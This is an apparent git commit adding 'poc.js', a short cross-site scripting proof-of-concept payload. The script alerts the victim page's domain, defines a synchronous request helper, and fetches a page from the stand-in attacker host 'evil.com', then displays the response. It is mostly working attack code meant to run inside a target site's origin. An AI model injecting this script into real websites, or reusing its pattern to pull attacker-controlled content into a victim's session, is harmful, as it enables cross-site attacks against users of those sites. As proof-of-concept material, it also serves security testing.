e45031c446761d9470aac306dbc54a4933bcf5f7
evilcos <evilcos@gmail.com>
2013-03-01 07:41:40 +0800

    init
    init

---
+++ poc.js
@@ -0,0 +1,12 @@
+﻿alert(document.domain+" | poc.js");
+xhr = getTransport();
+
+function req(method,src,argv){
+  xhr.open(method,src,false);
+  if(method=="POST")xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+  xhr.send(argv);
+  return xhr.responseText;
+}
+
+x = req("GET","http://evil.com/proxy/proxy.htm");
+alert(x);
